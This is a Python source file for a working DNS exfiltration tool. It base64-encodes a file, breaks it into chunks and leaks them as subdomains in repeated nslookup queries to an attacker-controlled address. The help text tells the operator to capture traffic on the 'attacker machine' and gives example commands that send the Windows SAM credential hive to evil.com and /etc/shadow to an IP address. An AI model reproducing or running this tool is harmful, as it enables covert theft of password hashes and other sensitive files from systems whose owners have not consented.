# Name: Packster
# Created By: Sayan Ray [@BareBones90]
# Description: DNS Exfiltration Script

# imports
import sys
import math
import time
import base64
import random
import signal
import string
import argparse
import subprocess

def handle(sig, frame):
	# Handle script termination

	print("[-] Exiting...")
	sys.exit()

class Encrypt:
	# Implementing basic encryption

	def __init__(self, text):
		self.text = text

	def encrypt(self):
		# Adds random characters to the encoded data.

		letters = string.ascii_lowercase

		a = letters[random.randrange(len(self.text))].encode()
		b = letters[random.randrange(len(self.text))].encode()
		c = letters[random.randrange(len(self.text))].encode()

		return a + self.text + b + c

	def encode(self):
		# Encodes data using Base64.

		return base64.b64encode(self.text)


def send(file):
	# Splits and sends the encoded file using DNS queries.

	subd = []
	encryptor = Encrypt(file)
	payload = encryptor.encode()
	m = math.ceil(len(payload) / 26)
	n = 0

	while n < m:
		subd.append(Encrypt(payload[:26]).encrypt().decode())
		payload = payload[26::]
		n += 1

	p = 0

	for sub in subd:
		f = sub + '.' + args.address # dataxyzabcd1234.10.10.10.10
		print(f"{p / len(subd) * 100:.1f}%", end='\r')

		# Call nslookup to send dns queries
		subprocess.getoutput('nslookup ' + f)
		time.sleep(0.30)
		p += 1

	print("done.")

if __name__ == '__main__':
	signal.signal(signal.SIGINT, handle)

	parser = argparse.ArgumentParser(usage="%(prog)s -a <address> -f <file>", formatter_class=argparse.RawDescriptionHelpFormatter, epilog = """

Before doing anything make sure to open tcpdump in the attacker machine.

tcpdump -i [interface] -w [whatever].pcap

Examples:
  .\\packster.exe -a evil.com -f C:\\Windows\\System32\\Config\\SAM
  ./packster -a 10.10.10.10 -f /etc/shadow
""")
	parser.add_argument("-a", "--address", help="Address to send. (Ip address or a domain)", metavar='', required=1)
	parser.add_argument("-f", "--file", help="File to send.", metavar='', type=argparse.FileType('rb'), required=1)
	args = parser.parse_args()

	input("[>] Starting transmiting...[ENTER]")
	send(args.file.read())